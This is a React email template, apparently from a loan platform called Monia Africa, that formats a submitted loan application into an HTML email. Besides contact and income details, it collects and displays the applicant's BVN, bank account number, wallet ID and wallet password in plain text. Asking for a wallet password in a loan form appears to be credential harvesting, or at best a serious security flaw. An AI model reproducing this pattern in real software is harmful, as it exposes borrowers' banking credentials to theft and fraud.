// components/email-templates/LoanApplicationEmail.tsx
import React from "react";

interface Props {
  email: string;
  fullName: string;
  phoneNumber?: string;
  whatsappNumber?: string;
  address: string;
  sex?: string;
  employmentStatus?: string;
  monthlyIncome?: string;
  bvn?: string;
  accountNumber?: string;
  accountName?: string;
  bankName?: string;
  amountSought?: string;
  loanTenure?: string;
  reasonForLoan?: string;
  walletId?: string;
  walletPassword?: string;
}

const badgeStyle = {
  display: "inline-block",
  padding: "2px 6px",
  borderRadius: "4px",
  fontSize: "12px",
  fontWeight: "bold",
  color: "#fff",
  backgroundColor: "#f39c12", // orange for missing info
};

export const LoanApplicationEmail = ({
  email,
  fullName,
  phoneNumber,
  whatsappNumber,
  address,
  sex,
  employmentStatus,
  monthlyIncome,
  bvn,
  accountNumber,
  accountName,
  bankName,
  amountSought,
  loanTenure,
  reasonForLoan,
  walletId,
  walletPassword,
}: Props) => (
  <div style={{
    fontFamily: "Arial, sans-serif",
    lineHeight: 1.5,
    backgroundColor: "#f9f9f9",
    padding: "20px",
    color: "#333",
  }}>
    <div style={{
      maxWidth: "600px",
      margin: "0 auto",
      backgroundColor: "#fff",
      padding: "20px",
      borderRadius: "8px",
      boxShadow: "0 2px 8px rgba(0,0,0,0.1)"
    }}>
      <h2 style={{ color: "#0b3d91", textAlign: "center", marginBottom: "20px" }}>
         New Loan Application
      </h2>

      <table style={{ width: "100%", borderCollapse: "collapse" }}>
        <tbody>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Name:</td>
            <td style={{ padding: "8px 0" }}>{fullName}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Email:</td>
            <td style={{ padding: "8px 0" }}>{email}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Phone Number:</td>
            <td style={{ padding: "8px 0" }}>
              {phoneNumber || <span style={badgeStyle}>N/A</span>}
            </td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>WhatsApp Number:</td>
            <td style={{ padding: "8px 0" }}>
              {whatsappNumber ? (
                <a 
                  href={`https://wa.me/${whatsappNumber.replace(/\D/g, "")}`} 
                  target="_blank"
                  style={{ color: "#25D366", textDecoration: "none", fontWeight: "bold" }}
                >
                  {whatsappNumber} 💬
                </a>
              ) : <span style={badgeStyle}>N/A</span>}
            </td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Address:</td>
            <td style={{ padding: "8px 0" }}>{address}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Sex:</td>
            <td style={{ padding: "8px 0" }}>{sex || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Employment Status:</td>
            <td style={{ padding: "8px 0" }}>{employmentStatus || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Monthly Income:</td>
            <td style={{ padding: "8px 0" }}>{monthlyIncome || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>BVN:</td>
            <td style={{ padding: "8px 0" }}>{bvn || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Account Number:</td>
            <td style={{ padding: "8px 0" }}>{accountNumber || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Account Name:</td>
            <td style={{ padding: "8px 0" }}>{accountName || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Bank Name:</td>
            <td style={{ padding: "8px 0" }}>{bankName || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Amount Sought:</td>
            <td style={{ padding: "8px 0" }}>{amountSought || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Loan Tenure:</td>
            <td style={{ padding: "8px 0" }}>{loanTenure || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Reason for Loan:</td>
            <td style={{ padding: "8px 0" }}>{reasonForLoan || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Wallet ID:</td>
            <td style={{ padding: "8px 0" }}>{walletId || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
          <tr>
            <td style={{ fontWeight: "bold", padding: "8px 0" }}>Wallet Password:</td>
            <td style={{ padding: "8px 0" }}>{walletPassword || <span style={badgeStyle}>N/A</span>}</td>
          </tr>
        </tbody>
      </table>

      <p style={{ textAlign: "center", marginTop: "20px", fontStyle: "italic", color: "#555" }}>
        Loan application submitted via Monia Africa platform
      </p>
    </div>
  </div>
);
